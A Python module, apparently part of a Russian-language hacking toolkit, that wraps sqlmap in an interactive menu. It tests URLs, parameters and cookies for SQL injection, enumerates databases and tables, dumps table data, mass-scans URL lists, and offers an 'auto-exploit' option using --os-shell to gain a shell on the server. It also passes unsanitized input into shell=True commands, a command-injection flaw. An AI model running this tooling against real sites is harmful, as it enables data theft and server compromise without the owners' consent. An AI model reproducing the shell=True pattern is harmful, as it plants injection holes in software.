"""
SQLMap Module — Тестирование веб-приложений на SQL-инъекции
"""

import subprocess
import sys
import os

# Добавляем корень проекта в путь при запуске напрямую
_project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from utils.helpers import (
    clear_screen, print_banner, print_success, print_error,
    print_info, print_warning, run_command, check_tool, save_output,
    safe_input
)
from utils.logger import setup_logger

logger = setup_logger()


def run_sqlmap_module():
    """Модуль SQLMap — тестирование SQL-инъекций"""
    while True:
        clear_screen()
        print_banner()
        print("\n  === SQLMap — Тестирование SQL-инъекций ===\n")
        print("  [1]  Проверить URL на SQL-инъекцию")
        print("  [2]  Получить список баз данных")
        print("  [3]  Получить список таблиц")
        print("  [4]  Экспорт данных из таблицы")
        print("  [5]  Проверить GET-параметр")
        print("  [6]  Проверить POST-запрос")
        print("  [7]  Проверить cookie")
        print("  [8]  Автоэксплуатация (dump)")
        print("  [9]  Сканер URL из файла")
        print("  [0]  Назад\n")
        
        choice = input("  >>> Ваш выбор: ").strip()
        
        if choice == "1":
            check_sql_injection()
        elif choice == "2":
            get_databases()
        elif choice == "3":
            get_tables()
        elif choice == "4":
            dump_data()
        elif choice == "5":
            check_get_param()
        elif choice == "6":
            check_post_request()
        elif choice == "7":
            check_cookie()
        elif choice == "8":
            auto_exploit()
        elif choice == "9":
            scan_urls_file()
        elif choice == "0":
            break
        else:
            print_error("Неверный выбор.")
            input("  [Enter для продолжения...]")


def get_sqlmap():
    """Получить путь к sqlmap"""
    if check_tool("sqlmap"):
        return "sqlmap"
    
    # Стандартные пути
    paths = [
        r"C:\Program Files\sqlmap\sqlmap.py",
        r"C:\sqlmap\sqlmap.py",
    ]
    
    for p in paths:
        if os.path.exists(p):
            return f'python "{p}"'
    
    return None


def check_sqlmap():
    """Проверка наличия sqlmap"""
    # Сначала ищем как утилиту
    if check_tool("sqlmap"):
        return True
    
    # Пробуем через python -m
    try:
        import importlib.util
        spec = importlib.util.find_spec("sqlmap")
        if spec is not None:
            return True
    except (ImportError, ModuleNotFoundError):
        pass
    
    # Пробуем через pip show
    stdout, _, rc = run_command(f'{sys.executable} -m pip show sqlmap')
    if rc == 0 and stdout.strip():
        print_success(" sqlmap установлен через pip!")
        return True
    
    print_error("sqlmap не найден!\n")
    print_info("Установка sqlmap:\n")
    print("  Вариант 1: pip install sqlmap")
    print("  Вариант 2: git clone https://github.com/sqlmapproject/sqlmap.git")
    print("  Вариант 3: https://sqlmap.org/\n")
    
    confirm = input("  Установить через pip? (y/n): ").strip().lower()
    if confirm == "y":
        stdout, stderr, rc = run_command(f'{sys.executable} -m pip install sqlmap')
        if rc == 0:
            print_success(" sqlmap установлен!")
        else:
            print_error(f" Ошибка: {stderr}")
    return False


def _get_sqlmap_cmd():
    """Получить команду запуска sqlmap (с полным путём)"""
    import shutil
    
    # 1. В PATH
    found = shutil.which("sqlmap")
    if found:
        return found
    
    # 2. Python Scripts — ищем sqlmap.exe
    python_dir = os.path.dirname(sys.executable)
    for subdir in ["Scripts", "bin"]:
        exe = os.path.join(python_dir, subdir, "sqlmap.exe")
        if os.path.exists(exe):
            return exe
    
    # 3. site-packages — ищем sqlmap.py
    site_packages = os.path.join(python_dir, "Lib", "site-packages")
    for root, dirs, files in os.walk(site_packages):
        if "sqlmap.py" in files:
            return f'{sys.executable} "{os.path.join(root, "sqlmap.py")}"'
    
    return "sqlmap"


def build_base_cmd(url=None):
    """Сборка базовой команды sqlmap"""
    cmd = _get_sqlmap_cmd()
    
    if url:
        cmd += f' -u "{url}"'
    
    cmd += " --batch --random-agent --timeout=30 --retries=2"
    
    return cmd


def check_sql_injection():
    """Проверка URL на SQL-инъекцию"""
    print_info("Проверка URL на SQL-инъекцию\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    
    if not url.startswith("http"):
        print_error(" URL должен начинаться с http:// или https://")
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    cmd = build_base_cmd(url)
    cmd += " --dbs"
    
    print_info(f"Команда: {cmd}\n")
    print_warning(" Проверка может занять время...\n")
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Проверка остановлена.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"SQL injection check: {url}")


def get_databases():
    """Получить список баз данных"""
    print_info("Получение списка баз данных\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    
    cmd = build_base_cmd(url)
    cmd += " --dbs"
    
    print_info(f"Команда: {cmd}\n")
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"Got databases list: {url}")


def get_tables():
    """Получить список таблиц"""
    print_info("Получение списка таблиц\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    db = input("  Имя базы данных (пусто = авто): ").strip()
    
    cmd = build_base_cmd(url)
    
    if db:
        cmd += f' -D "{db}"'
    
    cmd += " --tables"
    
    print_info(f"Команда: {cmd}\n")
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"Got tables list: {url}")


def dump_data():
    """Экспорт данных из таблицы"""
    print_info("Экспорт данных из таблицы\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    db = input("  Имя базы данных: ").strip()
    table = input("  Имя таблицы: ").strip()
    
    cmd = build_base_cmd(url)
    
    if db:
        cmd += f' -D "{db}"'
    if table:
        cmd += f' -T "{table}"'
    
    cmd += " --dump"
    
    print_info(f"Команда: {cmd}\n")
    print_warning(" Внимание: экспорт данных может быть незаконным!\n")
    
    confirm = input("  Продолжить? (y/n): ").strip().lower()
    if confirm != "y":
        print_info(" Отменено.")
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"Dumped data: {url}")


def check_get_param():
    """Проверка GET-параметра"""
    print_info("Проверка GET-параметра на SQL-инъекцию\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    param = input("  Имя параметра (напр. id, page, cat): ").strip()
    
    cmd = build_base_cmd(url)
    cmd += f' -p "{param}"'
    cmd += " --dbs"
    
    print_info(f"Команда: {cmd}\n")
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"Checked GET param: {url} param={param}")


def check_post_request():
    """Проверка POST-запроса"""
    print_info("Проверка POST-запроса на SQL-инъекцию\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    data = input("  Данные POST (напр. user=admin&pass=123): ").strip()
    
    cmd = build_base_cmd(url)
    cmd += f' --data="{data}"'
    cmd += " --dbs"
    
    print_info(f"Команда: {cmd}\n")
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"Checked POST request: {url}")


def check_cookie():
    """Проверка cookie на SQL-инъекцию"""
    print_info("Проверка cookie на SQL-инъекцию\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    cookie = input("  Cookie (напр. session=abc123): ").strip()
    
    cmd = build_base_cmd(url)
    cmd += f' --cookie="{cookie}"'
    cmd += " --dbs"
    
    print_info(f"Команда: {cmd}\n")
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info("Checked cookie for SQL injection")


def auto_exploit():
    """Автоэксплуатация уязвимости"""
    print_info("Автоэксплуатация SQL-инъекции\n")
    print_warning(" ⚠  Используйте только на своих ресурсах!\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    url = input("  Введите URL: ").strip()
    
    cmd = build_base_cmd(url)
    cmd += " --batch --random-agent"
    cmd += " --os-shell"
    
    print_info(f"Команда: {cmd}\n")
    print_warning(" Запрос будет попытаться получить shell на сервере!\n")
    
    confirm = input("  Продолжить? (y/n): ").strip().lower()
    if confirm != "y":
        print_info(" Отменено.")
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"Auto-exploit: {url}")


def scan_urls_file():
    """Сканирование списка URL из файла"""
    print_info("Сканирование списка URL из файла\n")
    
    if not check_sqlmap():
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    file_path = input("  Путь к файлу с URL (по одному на строку): ").strip()
    
    if not os.path.exists(file_path):
        print_error(f" Файл не найден: {file_path}")
        if safe_input("  [Enter для продолжения...]") is None:
            sys.exit(0)
        return
    
    cmd = f'{_get_sqlmap_cmd()} -l "{file_path}" --batch --random-agent --dbs'
    
    print_info(f"Команда: {cmd}\n")
    print_info("Сканирование...\n")
    
    try:
        subprocess.run(cmd, shell=True, check=True)
    except KeyboardInterrupt:
        print_warning("\n Сканирование остановлено.")
    except Exception as e:
        print_error(f" Ошибка: {e}")
    
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)
    logger.info(f"Scanned URLs from file: {file_path}")
